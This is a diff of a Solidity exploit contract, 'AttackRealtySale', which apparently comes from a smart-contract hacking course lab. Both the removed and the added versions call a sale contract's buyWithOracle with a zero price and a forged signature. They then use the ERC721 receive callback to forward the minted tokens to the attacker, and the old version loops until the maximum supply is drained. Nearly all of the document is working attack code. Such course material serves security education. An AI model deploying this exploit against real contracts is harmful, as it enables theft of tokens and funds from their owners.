@@ -1,68 +1,40 @@
-//SPDX-License-Identifier: MIT
-pragma solidity 0.8.13;
+// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
+// https://smartcontractshacking.com/#copyright-policy
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
 
-import "@openzeppelin/contracts/access/Ownable.sol";
+import {RealtySale} from "./RealtySale.sol";
+import {RealtyToken} from "./RealtyToken.sol";
 
-struct SharePrice {
-    uint256 expires; // Time which the price expires
-    uint256 price; // Share Price in ETH
+import "./Structs.sol";
+
+interface IERC721Receiver {
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
+        external
+        returns (bytes4);
 }
 
-struct Signature {
-    uint8 v;
-    bytes32 r;
-    bytes32 s;
-}
+contract AttackRealtySale is IERC721Receiver {
+    RealtySale realtySale;
+    RealtyToken realtyToken;
 
-interface IRealtySale {
-    function shareToken() external returns (address);
-
-    function buyWithOracle(
-        SharePrice calldata sharePrice,
-        Signature calldata signature
-    ) external payable;
-}
-
-interface IRealtyToken {
-    function transferFrom(address from, address to, uint256 tokenId) external;
-
-    function lastTokenID() external returns (uint256);
-
-    function maxSupply() external returns (uint256);
-}
-
-contract AttackRealtySale is Ownable {
-    address private immutable realtySale;
-    address private immutable realtyToken;
+    address owner;
 
     constructor(address _realtySale) {
-        realtySale = _realtySale;
-        realtyToken = IRealtySale(realtySale).shareToken();
+        owner = msg.sender;
+        realtySale = RealtySale(_realtySale);
+        realtyToken = RealtyToken(realtySale.getTokenContract());
     }
 
-    function attack() public onlyOwner {
-        SharePrice memory shareprice = SharePrice(block.timestamp + 9999, 0);
-        Signature memory sign = Signature(
-            1,
-            keccak256("random1"),
-            keccak256("random 2")
-        );
-        uint256 currSupply = IRealtyToken(realtyToken).lastTokenID();
-        uint256 maxSupply = IRealtyToken(realtyToken).maxSupply();
+    function attack() external {
+        SharePrice memory sharePrice = SharePrice({price: 0, expires: block.timestamp + 100000});
+        Signature memory signature = Signature(13, bytes32("some random"), bytes32("data"));
 
-        while (currSupply < maxSupply) {
-            IRealtySale(realtySale).buyWithOracle(shareprice, sign);
-            currSupply++;
-        }
+        realtySale.buyWithOracle(sharePrice, signature);
     }
 
-    function onERC721Received(
-        address operator,
-        address from,
-        uint256 tokenId,
-        bytes calldata data
-    ) external returns (bytes4) {
-        IRealtyToken(realtyToken).transferFrom(address(this), owner(), tokenId);
-        return this.onERC721Received.selector;
+    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external returns (bytes4) {
+        realtyToken.transferFrom(address(this), owner, tokenId);
+        return IERC721Receiver.onERC721Received.selector;
     }
 }
